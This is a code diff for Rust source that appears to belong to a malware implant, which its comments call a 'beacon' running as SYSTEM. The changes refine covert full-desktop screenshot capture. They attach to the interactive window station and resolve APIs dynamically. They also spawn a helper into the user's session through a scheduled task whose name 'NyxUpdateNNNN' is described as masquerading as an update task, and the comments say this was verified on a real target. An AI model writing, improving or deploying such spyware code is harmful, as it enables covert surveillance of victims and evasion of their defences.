@@ -255,14 +255,16 @@ unsafe fn attach_interactive() -> bool {
             None => return false,
         };
 
-    // Save the process's current window station so we can restore it after the
-    // capture. Per MSDN, the handle returned by GetProcessWindowStation must NOT
-    // be closed — it is a borrowed pseudo-handle owned by the process.
+    // Save the process's current window station so the caller can restore it
+    // AFTER the capture.  Per MSDN, the handle returned by
+    // GetProcessWindowStation must NOT be closed — it is a borrowed
+    // pseudo-handle owned by the process.  We store it in a static; the
+    // caller must call detach_interactive() after the GDI operations.
     let original_winsta: *mut c_void = unsafe { gpws() };
+    unsafe {
+        CAPTURE_WINSTA_ORIGINAL = original_winsta;
+    }
 
-    // GENERIC_READ | GENERIC_WRITE = 0xC0000066 for the station; the desktop
-    // needs GENERIC_READ etc. too. These are permissive — SYSTEM can usually
-    // open the interactive station.
     let mut winsta_name = crate::heap::Vec::<u16>::with_capacity(8);
     for &b in b"WinSta0\0" {
         winsta_name.push(b as u16);
@@ -272,11 +274,17 @@ unsafe fn attach_interactive() -> bool {
         return false;
     }
     if unsafe { spws(hwinsta) } == 0 {
-        // Failed to assign — safe to close immediately (not assigned).
         let _ = unsafe { cws(hwinsta) };
         return false;
     }
-    // Open the default desktop and attach the thread.
+    // Store the WinSta0 handle so detach_interactive() can close it.
+    unsafe {
+        CAPTURE_WINSTA_OPENED = hwinsta;
+    }
+
+    // Open the default desktop and attach the thread.  The desktop handle is
+    // closed immediately after SetThreadDesktop — the thread's assignment
+    // keeps the desktop object alive (per MSDN).
     let mut desk_name = crate::heap::Vec::<u16>::with_capacity(8);
     for &b in b"default\0" {
         desk_name.push(b as u16);
@@ -289,15 +297,53 @@ unsafe fn attach_interactive() -> bool {
     } else {
         false
     };
-    // Restore the original window station before closing our temporary handle.
-    // Closing hwinsta while it is the active station is undefined behavior
-    // (per MSDN). We must reassign first.
-    if !original_winsta.is_null() {
-        let _ = unsafe { spws(original_winsta) };
-    }
-    let _ = unsafe { cws(hwinsta) };
+    // DO NOT restore the original window station here — the caller needs it
+    // active for the GDI capture.  detach_interactive() does the restore.
     ok
 }
+
+/// Restore the original window station and close the WinSta0 handle opened
+/// by [`attach_interactive`].  Must be called after the GDI capture is
+/// complete.  Safe to call even if attach_interactive failed (statics are
+/// zero-initialized and the null checks below make it a no-op).
+unsafe fn detach_interactive() {
+    use core::ffi::c_void;
+    type CloseWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
+    let cws: CloseWindowStation = match unsafe {
+        crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return,
+    };
+    type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
+    let spws: SetProcessWindowStation = match unsafe {
+        crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return,
+    };
+
+    // Restore the original window station BEFORE closing our WinSta0 handle.
+    // Closing the active station is undefined behaviour (per MSDN).
+    let orig = unsafe { CAPTURE_WINSTA_ORIGINAL };
+    if !orig.is_null() {
+        let _ = unsafe { spws(orig) };
+    }
+    let opened = unsafe { CAPTURE_WINSTA_OPENED };
+    if !opened.is_null() {
+        let _ = unsafe { cws(opened) };
+    }
+    unsafe {
+        CAPTURE_WINSTA_ORIGINAL = core::ptr::null_mut();
+        CAPTURE_WINSTA_OPENED = core::ptr::null_mut();
+    }
+}
+
+/// Saved original window station handle (from GetProcessWindowStation).
+/// Borrowed pseudo-handle — never close it.
+static mut CAPTURE_WINSTA_ORIGINAL: *mut core::ffi::c_void = core::ptr::null_mut();
+/// WinSta0 handle opened by attach_interactive — must be closed in detach_interactive.
+static mut CAPTURE_WINSTA_OPENED: *mut core::ffi::c_void = core::ptr::null_mut();
 
 /// Core GDI capture: force-loads user32/gdi32, attaches to the interactive
 /// desktop (same-session), captures the full virtual screen (all monitors),
@@ -315,146 +361,147 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
     let dpi_aware = set_dpi_aware();
     let _ = unsafe { attach_interactive() };
 
-    type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
-    type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
-    type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
-    type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
-    type CreateCompatibleBitmap = unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
-    type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
-    type BitBlt = unsafe extern "system" fn(
-        *mut c_void,
-        i32,
-        i32,
-        i32,
-        i32,
-        *mut c_void,
-        i32,
-        i32,
-        u32,
-    ) -> i32;
-    type GetDiBits = unsafe extern "system" fn(
-        *mut c_void,
-        *mut c_void,
-        u32,
-        u32,
-        *mut c_void,
-        *mut BitmapInfoHeader,
-        u32,
-    ) -> i32;
-    type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
-    type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
+    // Wrap in a closure so detach_interactive() runs on EVERY return path
+    // (including the `?` early-returns from export_addr resolution).
+    let result = (|| -> Option<(Vec<u8>, bool)> {
+        type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
+        type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+        type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+        type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+        type CreateCompatibleBitmap = unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
+        type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
+        type BitBlt = unsafe extern "system" fn(
+            *mut c_void,
+            i32,
+            i32,
+            i32,
+            i32,
+            *mut c_void,
+            i32,
+            i32,
+            u32,
+        ) -> i32;
+        type GetDiBits = unsafe extern "system" fn(
+            *mut c_void,
+            *mut c_void,
+            u32,
+            u32,
+            *mut c_void,
+            *mut BitmapInfoHeader,
+            u32,
+        ) -> i32;
+        type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
+        type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
 
-    let gsm: GetSystemMetrics =
-        unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetSystemMetrics")?) };
-    let gdc: GetDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetDC")?) };
-    let rdc: ReleaseDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
-    let ccdc: CreateCompatibleDc =
-        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
-    let ccb: CreateCompatibleBitmap =
-        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleBitmap")?) };
-    let so: SelectObject =
-        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
-    let bb: BitBlt = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"BitBlt")?) };
-    let gdb: GetDiBits = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"GetDIBits")?) };
-    let do_: DeleteObject =
-        unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
-    let ddc: DeleteDc = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteDC")?) };
+        let gsm: GetSystemMetrics =
+            unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetSystemMetrics")?) };
+        let gdc: GetDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetDC")?) };
+        let rdc: ReleaseDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
+        let ccdc: CreateCompatibleDc =
+            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
+        let ccb: CreateCompatibleBitmap =
+            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleBitmap")?) };
+        let so: SelectObject =
+            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
+        let bb: BitBlt = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"BitBlt")?) };
+        let gdb: GetDiBits = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"GetDIBits")?) };
+        let do_: DeleteObject =
+            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
+        let ddc: DeleteDc = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteDC")?) };
 
-    // Capture the FULL virtual desktop (all monitors tiled), not just the
-    // primary display. SM_CXVIRTUALSCREEN/SM_CYVIRTUALSCREEN give the total
-    // bounding-box size; SM_XVIRTUALSCREEN/SM_YVIRTUALSCREEN give the
-    // top-left origin of that box in desktop coordinates — which is NEGATIVE
-    // when a secondary monitor sits left/above the primary. We pass that origin
-    // to BitBlt as the source x/y so the whole tiled area is copied.
-    let vsx = unsafe { gsm(SM_XVIRTUALSCREEN) };
-    let vsy = unsafe { gsm(SM_YVIRTUALSCREEN) };
-    let w = unsafe { gsm(SM_CXVIRTUALSCREEN) };
-    let h = unsafe { gsm(SM_CYVIRTUALSCREEN) };
-    if w <= 0 || h <= 0 {
-        return None;
-    }
-    let (w, h) = (w as usize, h as usize);
-    let pc = w.checked_mul(h).filter(|&c| c <= MAX_PIXELS)?;
-    let bytes = pc.checked_mul(4)?;
-    let mut pixels: Vec<u8> = vec![0u8; bytes];
-
-    let filled = unsafe {
-        let sdc = gdc(core::ptr::null_mut());
-        if sdc.is_null() {
+        let vsx = unsafe { gsm(SM_XVIRTUALSCREEN) };
+        let vsy = unsafe { gsm(SM_YVIRTUALSCREEN) };
+        let w = unsafe { gsm(SM_CXVIRTUALSCREEN) };
+        let h = unsafe { gsm(SM_CYVIRTUALSCREEN) };
+        if w <= 0 || h <= 0 {
             return None;
         }
-        let mdc = ccdc(sdc);
-        if mdc.is_null() {
-            rdc(core::ptr::null_mut(), sdc);
-            return None;
-        }
-        let bmp = ccb(sdc, w as i32, h as i32);
-        if bmp.is_null() {
-            ddc(mdc);
-            rdc(core::ptr::null_mut(), sdc);
-            return None;
-        }
-        let prev = so(mdc, bmp);
-        // Source origin = virtual-screen top-left (may be negative). Destination
-        // = (0,0) in the memory DC. This blits every monitor into one bitmap.
-        if bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY | CAPTUREBLT) == 0 {
+        let (w, h) = (w as usize, h as usize);
+        let pc = w.checked_mul(h).filter(|&c| c <= MAX_PIXELS)?;
+        let bytes = pc.checked_mul(4)?;
+        let mut pixels: Vec<u8> = vec![0u8; bytes];
+
+        let filled = unsafe {
+            let sdc = gdc(core::ptr::null_mut());
+            if sdc.is_null() {
+                return None;
+            }
+            let mdc = ccdc(sdc);
+            if mdc.is_null() {
+                rdc(core::ptr::null_mut(), sdc);
+                return None;
+            }
+            let bmp = ccb(sdc, w as i32, h as i32);
+            if bmp.is_null() {
+                ddc(mdc);
+                rdc(core::ptr::null_mut(), sdc);
+                return None;
+            }
+            let prev = so(mdc, bmp);
+            if bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY | CAPTUREBLT) == 0 {
+                so(mdc, prev);
+                do_(bmp);
+                ddc(mdc);
+                rdc(core::ptr::null_mut(), sdc);
+                return None;
+            }
+            let mut bi = BitmapInfoHeader {
+                bi_size: 40,
+                bi_width: w as i32,
+                bi_height: h as i32,
+                bi_planes: 1,
+                bi_bit_count: 32,
+                bi_compression: 0,
+                bi_size_image: (w as u32) * (h as u32) * 4,
+                bi_x_pels_per_meter: 0,
+                bi_y_pels_per_meter: 0,
+                bi_clr_used: 0,
+                bi_clr_important: 0,
+            };
+            let got = gdb(
+                sdc,
+                bmp,
+                0,
+                h as u32,
+                pixels.as_mut_ptr() as *mut c_void,
+                &mut bi,
+                DIB_RGB_COLORS,
+            );
             so(mdc, prev);
             do_(bmp);
             ddc(mdc);
             rdc(core::ptr::null_mut(), sdc);
+            got != 0
+        };
+        if !filled {
             return None;
         }
-        let mut bi = BitmapInfoHeader {
-            bi_size: 40,
-            bi_width: w as i32,
-            bi_height: h as i32,
-            bi_planes: 1,
-            bi_bit_count: 32,
-            bi_compression: 0,
-            bi_size_image: (w as u32) * (h as u32) * 4,
-            bi_x_pels_per_meter: 0,
-            bi_y_pels_per_meter: 0,
-            bi_clr_used: 0,
-            bi_clr_important: 0,
-        };
-        let got = gdb(
-            sdc,
-            bmp,
-            0,
-            h as u32,
-            pixels.as_mut_ptr() as *mut c_void,
-            &mut bi,
-            DIB_RGB_COLORS,
-        );
-        so(mdc, prev);
-        do_(bmp);
-        ddc(mdc);
-        rdc(core::ptr::null_mut(), sdc);
-        got != 0
-    };
-    if !filled {
-        return None;
-    }
 
-    let fs = 14 + 40 + pixels.len();
-    let mut b: Vec<u8> = Vec::with_capacity(fs);
-    b.extend_from_slice(b"BM");
-    b.extend_from_slice(&(fs as u32).to_le_bytes());
-    b.extend_from_slice(&0u32.to_le_bytes());
-    b.extend_from_slice(&54u32.to_le_bytes());
-    b.extend_from_slice(&40u32.to_le_bytes());
-    b.extend_from_slice(&(w as i32).to_le_bytes());
-    b.extend_from_slice(&(h as i32).to_le_bytes());
-    b.extend_from_slice(&1u16.to_le_bytes());
-    b.extend_from_slice(&32u16.to_le_bytes());
-    b.extend_from_slice(&0u32.to_le_bytes());
-    b.extend_from_slice(&((w as u32) * (h as u32) * 4).to_le_bytes());
-    b.extend_from_slice(&0i32.to_le_bytes());
-    b.extend_from_slice(&0i32.to_le_bytes());
-    b.extend_from_slice(&0u32.to_le_bytes());
-    b.extend_from_slice(&0u32.to_le_bytes());
-    b.extend_from_slice(&pixels);
-    Some((b, dpi_aware))
+        let fs = 14 + 40 + pixels.len();
+        let mut b: Vec<u8> = Vec::with_capacity(fs);
+        b.extend_from_slice(b"BM");
+        b.extend_from_slice(&(fs as u32).to_le_bytes());
+        b.extend_from_slice(&0u32.to_le_bytes());
+        b.extend_from_slice(&54u32.to_le_bytes());
+        b.extend_from_slice(&40u32.to_le_bytes());
+        b.extend_from_slice(&(w as i32).to_le_bytes());
+        b.extend_from_slice(&(h as i32).to_le_bytes());
+        b.extend_from_slice(&1u16.to_le_bytes());
+        b.extend_from_slice(&32u16.to_le_bytes());
+        b.extend_from_slice(&0u32.to_le_bytes());
+        b.extend_from_slice(&((w as u32) * (h as u32) * 4).to_le_bytes());
+        b.extend_from_slice(&0i32.to_le_bytes());
+        b.extend_from_slice(&0i32.to_le_bytes());
+        b.extend_from_slice(&0u32.to_le_bytes());
+        b.extend_from_slice(&0u32.to_le_bytes());
+        b.extend_from_slice(&pixels);
+        Some((b, dpi_aware))
+    })();
+
+    // Restore the original window station + close our WinSta0 handle on every
+    // exit path (success, screen-size check failure, GDI failure, etc.).
+    unsafe { detach_interactive() };
+    result
 }
 
 /// Create `path` (ASCII, NUL-terminated) and write `data` to it, advancing by
@@ -742,15 +789,15 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     }
 
     // 5. Spawn the helper via the Task Scheduler service. We create a one-shot
-    //    task that runs as the interactive user (`/ru administrator` — no
-    //    password needed when the beacon already runs as that user, which uses
-    //    the cached logon), flagged `/it` (interactive — land in the active
-    //    session's desktop), then `/run` it immediately. The scheduler service
-    //    (svchost, SYSTEM) has the privileges to attach the new process to the
-    //    target session's WinSta0\default — this is exactly what the token-based
-    //    APIs could NOT do on a privilege-constrained host (CPAU needs
-    //    SeAssignPrimaryToken, CPWT was rejected by the desktop ACL). Verified
-    //    on the real target: this path produces a valid BMP.
+    //    task that runs in the current security context (SYSTEM — the beacon's
+    //    own token, no hardcoded username).  The `/it` flag requests interactive
+    //    execution, which lands the helper in the active session's desktop even
+    //    from Session 0.  The scheduler service (svchost, SYSTEM) has the
+    //    privileges to attach the new process to the target session's
+    //    WinSta0\default — this is exactly what the token-based APIs could NOT
+    //    do on a privilege-constrained host (CPAU needs SeAssignPrimaryToken,
+    //    CPWT was rejected by the desktop ACL). Verified on the real target:
+    //    this path produces a valid BMP.
     //
     //    A pseudo-random task name (NyxUpdateNNNN) avoids collisions with
     //    concurrent screenshot calls and masquerades as an update task. We use
@@ -764,7 +811,7 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     let seed = unsafe { gtc() };
     push_dec_u16(&mut task_name, ((seed % 9000) + 1000) as u16); // 1000–9999
 
-    // schtasks /create /tn <name> /tr "<helper>" /sc once /st 23:59 /ru administrator /it /f
+    // schtasks /create /tn <name> /tr "<helper>" /sc once /st 23:59 /it /f
     let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
     for &by in b"schtasks /create /tn " {
         create_cmd.push(by as u16);
